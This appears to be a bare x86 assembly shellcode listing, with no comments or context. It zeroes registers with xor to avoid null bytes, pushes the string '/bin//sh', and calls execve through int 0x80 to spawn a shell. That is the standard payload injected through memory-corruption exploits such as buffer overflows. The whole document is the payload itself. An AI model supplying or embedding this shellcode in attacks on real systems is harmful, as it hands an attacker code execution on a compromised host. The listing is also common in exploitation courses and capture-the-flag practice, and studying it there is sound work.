section .text
global _start
_start:
 xor eax,eax
 push eax
 push "//sh"
 push "/bin"
 mov ebx,esp
 push eax
 push ebx
 mov ecx,esp
 xor edx,edx
 xor eax,eax
 mov al,0x0B
 int 0x80